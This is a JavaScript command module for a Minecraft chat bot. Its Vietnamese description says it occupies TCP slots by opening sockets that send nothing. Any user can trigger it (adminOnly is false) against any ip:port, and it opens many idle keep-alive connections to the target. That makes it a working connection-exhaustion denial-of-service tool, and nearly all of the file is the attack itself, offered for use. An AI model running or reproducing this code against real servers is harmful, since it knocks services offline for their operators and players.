import net from 'net'
import config from '../config.js'

export default {
  name: 'ide',
  description: 'Chiếm slot TCP bằng cách mở socket không gửi gì',
  adminOnly: false,

  async execute(bot, username, args) {
    const ip = args[0]?.split(':')[0] || config.host
    const port = parseInt(args[0]?.split(':')[1]) || config.port
    const threads = parseInt(args[1]) || 10

    const send = (msg) => bot.chat(`/minecraft:w ${username} ${msg}`) 

    send(`Đang mở ${threads} socket tới ${ip}:${port} không gửi gì...`)

    for (let i = 0; i < threads; i++) {
      setTimeout(() => {
        const sock = new net.Socket()

        sock.connect(port, ip, () => {
          send(`[#${i}] Kết nối thành công`)
          sock.setKeepAlive(true)
        })

        sock.on('error', err => {
          send(`[#${i}] Lỗi: ${err.message}`)
        })

        sock.on('close', () => {
          console.log(`[#${i}] Socket đóng`)
        })
      }, i * 50)
    }
  }
}